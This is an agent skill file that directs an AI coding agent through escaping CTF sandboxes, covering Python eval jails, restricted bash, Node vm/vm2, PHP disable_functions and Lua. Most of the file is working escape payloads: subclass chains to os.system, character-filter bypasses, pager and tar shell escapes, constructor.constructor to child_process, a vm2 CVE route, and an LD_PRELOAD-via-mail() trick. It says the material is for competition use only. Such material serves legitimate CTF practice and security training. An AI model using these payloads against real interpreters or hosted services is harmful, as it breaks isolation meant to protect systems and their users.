---
name: ctf-jail
description: Provides sandbox and jail escape techniques for CTF challenges. Use when the target runs your input inside a restricted Python eval or exec, a bash restricted shell, a Node.js vm or vm2 context, a Lua or PHP sandbox, or any filter that blocks characters, keywords, builtins or imports while still letting code run. Also use for pyjail or bashjail prompts, "escape the sandbox", "no quotes", "only these characters allowed", and disable_functions or open_basedir bypasses. Do not use it for seccomp-filtered native binaries or ROP chains (use ctf-pwn), and do not use it for web application logic bugs with no interpreter sandbox.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
metadata:
  user-invocable: "false"
---

# CTF Jail & Sandbox Escape

Every jail is a filter plus an execution primitive. Read the filter source **first**, then pick the shortest route to `open('/flag')`.

## Scope and safety

Jails in CTF challenges are designed to be escaped. Do not reuse these payloads against production services. Keep working scripts under `ctf-solver/workspaces/<challenge>/`.

## Step 1: Classify the jail

| Evidence | Jail type | First move |
|---|---|---|
| `eval(input)`, `exec(input)`, `compile()` | Python eval/exec | Builtin and subclass chains |
| `input()` loop, `python3 -c` with `-S` or restricted `__builtins__` | Python restricted | Recover `__builtins__`, then `__import__` |
| `rbash`, `sh -r`, `PATH` reset, `cd` blocked | Bash restricted shell | Shell builtins and pager escapes |
| `vm.runInNewContext`, `vm2`, `quickjs` | JS sandbox | `constructor.constructor` / known CVE |
| `disable_functions`, `open_basedir` | PHP | `putenv`+`LD_PRELOAD`, `FFI`, `mail()` |
| `loadstring`, `os` missing | Lua | Table indexing and registry access |
| `seccomp`, `prctl`, allowed syscall list | Native sandbox | Stop: use `/ctf-pwn` |

If the challenge gives you the filter, diff it against a normal interpreter. The bug is whatever it forgot.

## Python jails

Quick wins, in order — try all five before inventing anything:

```python
__import__('os').system('cat /flag')
__import__('os').popen('cat /flag').read()
breakpoint()                      # py3.7+, drops into pdb; then !cat /flag
help()                            # then: !cat /flag  (pager shell escape)
license()                         # same pager trick
```

If builtins are stripped, walk to them:

```python
().__class__.__base__.__subclasses__()                    # list every loaded class
[x for x in ().__class__.__base__.__subclasses__() if 'warning' in x.__name__][0]()._module.__builtins__['__import__']('os').system('sh')
globals()['__builtins__']['__import__']('os').system('sh')
vars(__builtins__) if '__builtins__' in globals() else None
```

Useful stable indices are fragile across versions — **print the list first**, then index the class you actually saw (typically `warnings.catch_warnings`, `os._wrap_close`, or `subprocess.Popen`).

**Character and keyword filters:**

| Blocked | Bypass |
|---|---|
| quotes | `chr(47)`, `bytes([47]).decode()`, `'%c' % 47`, `().__doc__[0]` |
| `_` | `getattr(o, chr(95)*2 + 'class' + chr(95)*2)`, `vars()`, `dir()` |
| dots | `getattr`, `o[attr]`, `dict(zip(...))` |
| `import` | `__import__`, `importlib.import_module`, `__builtins__['__import__']` |
| digits | `len('aaaa')`, `True+True`, `ord('a')-ord('a')`, `(1).__class__` tricks |
| spaces | tabs, `/**/`, parenthesised expressions, newlines |
| `+` | `''.join([...])`, `f'{a}{b}'`, `%` formatting |
| parentheses | decorators (`@__import__`), walrus, `print` as a statement |
| almost everything | repunit decomposition, lambda calculus — see [../ctf-misc/pyjails.md](../ctf-misc/pyjails.md) |

Walrus reassignment is the standard escape from "variables are fixed" puzzles: `(abcdef := 'new')` rebinds a constrained name. Decorator form escapes "no calls, no quotes":

```python
@__import__
@os.system
@'/bin/sh'
class X: pass
```

**f-string / format-spec injection:** when the challenge stores your string in a config and renders it, a key named `eval(payload)` executes during rendering — see [../ctf-misc/pyjails.md](../ctf-misc/pyjails.md#python-f-string-config-injection-via-stored-eval-inshack-2018).

**Audit hooks:** if `sys.addaudithook` is installed, prefer paths that do not trip the audited event (e.g. read via `os.open`/`os.read` instead of `open`, or reach the flag through a class already holding it). Do not assume you can remove the hook.

## Bash restricted shells

```bash
# read the flag without cat/head/less
HISTFILE=/flag /bin/bash && history
bash -v /flag.txt                 # verbose mode echoes file lines
exec 3< /flag; cat <&3            # redirection still works

# editor and pager escapes
vi /tmp/x   →  :!sh    :set shell=/bin/sh  :shell
less /etc/passwd  →  !sh
awk 'BEGIN{system("/bin/sh")}'
find / -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Globbing and quoting beat `PATH` filters:

```bash
/?in/?sh          # /bin/sh without naming it
/bin/c?t /flag
$'\x2fbin\x2fsh'  # hex-escaped path
/proc/self/root/flag   # same file, different path string
cp /flag /tmp/f; /bin/sh
```

`$0`, `BASH_ENV=/tmp/payload`, `PS4='$(sh)'`, and `PROMPT_COMMAND` are all rebound on the next shell start. Full catalogue: [../ctf-misc/bashjails.md](../ctf-misc/bashjails.md).

## JavaScript / Node sandboxes

```js
this.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /flag').toString()
this.constructor.constructor('return global')()
process.binding('spawn_sync')                    // no require needed
```

`vm` is not a security boundary — any reachable host object gives you the real `Function` constructor. For `vm2`, check the version with `npm ls vm2` and its known `Promise[@@species]` escape (CVE-2023-37466, fixed in 3.9.19); library-level detail lives in [../ctf-web/node-and-prototype.md](../ctf-web/node-and-prototype.md#affected-libraries). For quickjs/isolated-vm, look for host callbacks that accept objects and leak a prototype.

## PHP `disable_functions` and `open_basedir`

```bash
# LD_PRELOAD route (needs putenv + a writable dir + a binary that spawns a child)
# compile a .so that overrides getuid() and runs your command, then:
#   putenv("LD_PRELOAD=/tmp/x.so"); mail("a@b","","","");   (5th param = -f, older PHP)
ls -l /proc/self/root/          # open_basedir often misses /proc/self/root
```

Others: `FFI` when enabled, `pcntl_exec`, `imap_open` mailbox injection (PHP < 8), `.htaccess` with `auto_prepend_file`, `php://filter` chains for source disclosure, and `glob://` for listing. `open_basedir` is bypassable through `/proc/self/cwd`, symlink races, and `chdir` plus relative paths.

## Lua and other interpreters

```lua
os["execute"]("cat /flag")        -- when os.execute is filtered by name
loadstring("return os.execute('sh')")()
debug.getregistry()               -- reach host functions through the registry
```

Ruby: `$stdout` plus backticks, `Kernel#system` via `send`, `ObjectSpace`. Perl: `open(my $fh, '<', '/flag')` alternates, `qx//`, `readpipe`.

## Escape checklist

1. Is the flag readable at all from this process (`open_basedir`, uid, mount)?
2. Which builtin or native function is still reachable?
3. Can you reach a module loader, a class hierarchy, or a host object?
4. Does the filter run on your input, the compiled object, or the output?
5. Is there an oracle (length, comparison, error message) instead of a direct escape? Then binary search — see [../ctf-misc/pyjails.md](../ctf-misc/pyjails.md) for oracle patterns.

## When to pivot

- You have code execution inside a process with a seccomp filter and need syscalls, not Python → `/ctf-pwn`
- The jail is really an encoding or restricted-charset puzzle with no interpreter → `/ctf-misc`
- The sandbox is reached through a web upload or template → `/ctf-web`
- The "jail" is a Kubernetes or container sandbox → `/ctf-cloud`

## Verify

```bash
python3 -c 'print(().__class__.__base__)'
echo $0; echo $BASH_VERSION
node -e 'console.log(this.constructor.constructor("return 1")())'
```

Confirm the escape on the challenge's own entrypoint before writing it up — a payload that works in your shell but not through their `input()` wrapper is the most common wasted hour.
